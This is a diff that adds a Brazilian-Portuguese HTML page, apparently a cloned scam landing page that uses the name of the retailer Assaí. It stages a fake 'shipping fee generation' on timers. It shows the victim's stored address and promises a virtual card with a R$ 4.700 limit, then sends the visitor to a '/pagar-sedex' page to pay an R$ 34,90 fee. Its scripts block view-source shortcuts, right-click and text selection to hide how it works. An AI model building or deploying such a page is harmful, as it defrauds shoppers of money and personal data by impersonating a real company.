@@ -1,0 +1,395 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    
+        <!-- Meta Pixel Code -->
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1289289589600537');
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1289289589600537&ev=PageView&noscript=1"
+    /></noscript>
+<!-- End Meta Pixel Code -->
+
+
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+
+    <meta charset="UTF-8">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <style>
+        .header {
+            background-color: #1E3A80;
+            padding: 15px 0;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: bold;
+            border-bottom: solid 3px #ee4d2d;
+        }
+
+        .main-content {
+            max-width: 450px;
+            background-color: white;
+            text-align: center;
+            padding: 2rem 2rem 1rem 2rem;
+            border-radius: 10px;
+            box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
+            margin: 0 auto;
+        }
+
+        .main-content h2 {
+            margin-bottom: 20px;
+        }
+
+        .btn-custom {
+            color: white;
+            border: none;
+            width: 100%;
+            margin-bottom: 10px;
+            background: #1E3A80;
+            font-weight: 600;
+            border-radius: 1rem;
+            padding: .75rem 3rem;
+            letter-spacing: .3px;
+            line-height: 1.15;
+        }
+
+        .btn-custom:hover {
+            color: white !important;
+            background-color: #1E3A80;
+            transform: scale(1.02) !important;
+        }
+
+        .footer {
+            background: #ffffff;
+            border-top: 1px solid #e6e6e6;
+            text-align: center;
+            padding: 15px;
+            font-size: 10px;
+            color: #666;
+        }
+
+        .spinner-container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100px;
+        }
+
+        .details-block {
+            text-align: left;
+            border: 1px solid #ddd;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+
+        .details-block h4 {
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+
+        .details-block div {
+            margin-bottom: 15px;
+            border-bottom: 1px solid #ddd;
+            padding-bottom: 10px;
+        }
+
+        .details-block div:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+        }
+
+        .card-highlight {
+            background-color: #e6f7e6;
+            border: 1px solid #c3e6cb;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: left;
+        }
+
+        .card-highlight h4 {
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #155724;
+        }
+
+        .card-highlight p {
+            font-size: 0.95rem;
+            color: #155724;
+        }
+
+        .success-block {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: left;
+        }
+
+        .success-block h4 {
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: green;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+    </style>
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("keydown", bloquearSource);
+        } else { //Versões antigas do IE
+            document.attachEvent("onkeydown", bloquearSource);
+        }
+
+        function bloquearSource(e) {
+            e = e || window.event;
+
+            var code = e.which || e.keyCode;
+
+            if (
+                e.ctrlKey &&
+                (code == 83 || code == 85) //83 = S, 85 = U
+            ) {
+                if (e.preventDefault) {
+                    e.preventDefault();
+                } else {
+                    e.returnValue = false;
+                }
+
+                return false;
+            }
+        }
+    </script>
+    <style>
+        /*desabilita a seleção no body*/
+        body {
+            -webkit-touch-callout: none;
+            /* iOS Safari */
+            -webkit-user-select: none;
+            /* Chrome/Safari/Opera */
+            -khtml-user-select: none;
+            /* Konqueror */
+            -moz-user-select: none;
+            /* Firefox */
+            -ms-user-select: none;
+            /* Internet Explorer/Edge */
+            user-select: none;
+        }
+
+        /*habilita a seleção nos campos editaveis*/
+        input,
+        textarea {
+            -webkit-touch-callout: initial;
+            /* iOS Safari */
+            -webkit-user-select: text;
+            /* Chrome/Safari/Opera */
+            -khtml-user-select: text;
+            /* Konqueror */
+            -moz-user-select: text;
+            /* Firefox */
+            -ms-user-select: text;
+            /* Internet Explorer/Edge */
+            user-select: text;
+        }
+
+        /*habilita a seleção nos campos com o atributo contenteditable*/
+        [contenteditable=true] {
+            -webkit-touch-callout: initial;
+            /* iOS Safari */
+            -webkit-user-select: all;
+            /* Chrome/Safari/Opera */
+            -khtml-user-select: all;
+            /* Konqueror */
+            -moz-user-select: all;
+            /* Firefox */
+            -ms-user-select: all;
+            /* Internet Explorer/Edge */
+            user-select: all;
+        }
+    </style>
+
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("contextmenu", function (e) {
+                e.preventDefault();
+                return false;
+            });
+        } else { //Versões antigas do IE
+            document.attachEvent("oncontextmenu", function (e) {
+                e = e || window.event;
+                e.returnValue = false;
+                return false;
+            });
+        }
+    </script>
+
+   <!-- Meta Pixel Code -->
+<script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1150741756723798');
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1150741756723798&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Meta Pixel Code -->
+
+   
+</head>
+
+<body>
+    <div style="
+  display: grid;
+  grid-template-areas:
+    'top-bar'
+    'content'
+    'footer';
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
+">
+        <div class="header">
+            <img decoding="async" style="width: 120px;" src="images/logo.svg" alt="Imagem Centralizada">
+        </div>
+
+        <div style="grid-area: content; padding: 0 1rem;">
+            <div class="main-content">
+                <!-- Primeira etapa de geração da taxa -->
+                <div id="etapa1" class="spinner-container">
+                    <p>Gerando a Taxa de Correios - SEDEX...</p>
+                    <div class="spinner-border" role="status">
+                        <span class="visually-hidden">Carregando...</span>
+                    </div>
+                </div>
+
+                <!-- Segunda etapa - Taxa de envio gerada -->
+                <div id="etapa2" class="success-block d-none">
+                    <h4>
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="green"
+                            class="bi bi-check-circle-fill" viewbox="0 0 16 16">
+                            <path
+                                d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM6.354 10.354l4-4a.5.5 0 1 0-.708-.708L6 9.293 4.354 7.646a.5.5 0 1 0-.708.708l2 2a.5.5 0 0 0 .708 0z">
+                            </path>
+                        </svg>
+                        Taxa de envio gerada com sucesso!
+                    </h4>
+                </div>
+
+                <div class="details-block d-none" id="etapa-detalhes">
+                    <h4>Detalhes do Envio</h4>
+                    <div>
+                        <strong>Endereço de entrega:</strong>
+                        <p id="enderecoCliente">Carregando...</p>
+                    </div>
+                    <div>
+                        <strong>Método de envio:</strong>
+                        <p><strong>SEDEX<br>
+                                R$ 34,90</strong><br>
+                            1 dia útil<br>
+                            Taxa única de envio • Rastreamento online</p>
+                    </div>
+                    <div>
+                        <strong>Início do envio:</strong>
+                        <p>Hoje iniciaremos o procedimento de envio em até 2 horas</p>
+                    </div>
+                </div>
+
+                <!-- Cartão Virtual Disponível Hoje -->
+                <div id="etapa3" class="card-highlight d-none">
+                    <h4>
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                            class="bi bi-credit-card" viewbox="0 0 16 16">
+                            <path
+                                d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2H0zm0 3h16v5a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V7zm3.5 2a.5.5 0 0 0 0 1h2a.5.5 0 0 0 0-1h-2z">
+                            </path>
+                        </svg>
+                        Cartão Virtual Disponível Hoje
+                    </h4>
+                    <p>Você receberá hoje seu cartão virtual com limite de R$ 4.700 para começar a usar imediatamente,
+                        enquanto seu cartão físico está a caminho.</p>
+                </div>
+
+                <!-- Botão Final -->
+                <button type="button" id="confirmar" onclick="redirecionarUtms()"
+                    class="btn btn-custom w-100 rounded-pill mt-4 d-none">SIM, VOU QUERER!</button>
+            </div>
+        </div>
+
+        <script>
+            function redirecionarUtms() {
+                window.location.href = '/pagar-sedex' + window.location.search;
+            }
+        </script>
+
+        <!-- Footer -->
+        <div class="footer">
+            Copyright © 2025 Assaí. Todos os direitos reservados.<br>
+
+            Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa do Site
+        </div>
+
+        <script>
+            function mostrarEtapas() {
+                // Simula a geração da taxa
+                setTimeout(() => {
+                    document.getElementById('etapa1').classList.add('d-none');
+                    document.getElementById('etapa2').classList.remove('d-none');
+                }, 3000);
+
+                // Simula a exibição dos detalhes e do botão
+                setTimeout(() => {
+                    document.getElementById('etapa-detalhes').classList.remove('d-none');
+                    document.getElementById('etapa3').classList.remove('d-none');
+                    document.getElementById('confirmar').classList.remove('d-none');
+
+                    // Obtém o endereço armazenado no localStorage
+                    const endereco = JSON.parse(localStorage.getItem('enderecoCliente'));
+                    if (endereco) {
+                        document.getElementById('enderecoCliente').innerHTML = `
+                        ${endereco.rua}, ${endereco.numero}<br>
+                        ${endereco.bairro}<br>
+                        ${endereco.cidade}-${endereco.estado}<br>
+                        CEP: ${endereco.cep}
+                    `;
+                    } else {
+                        document.getElementById('enderecoCliente').innerText = 'Endereço não encontrado.';
+                    }
+                }, 6000);
+            }
+
+            // Executa a função ao carregar a página
+            window.onload = mostrarEtapas;
+        </script>
+    </div>
+
+
+
+
+
+</body>
+
+</html>
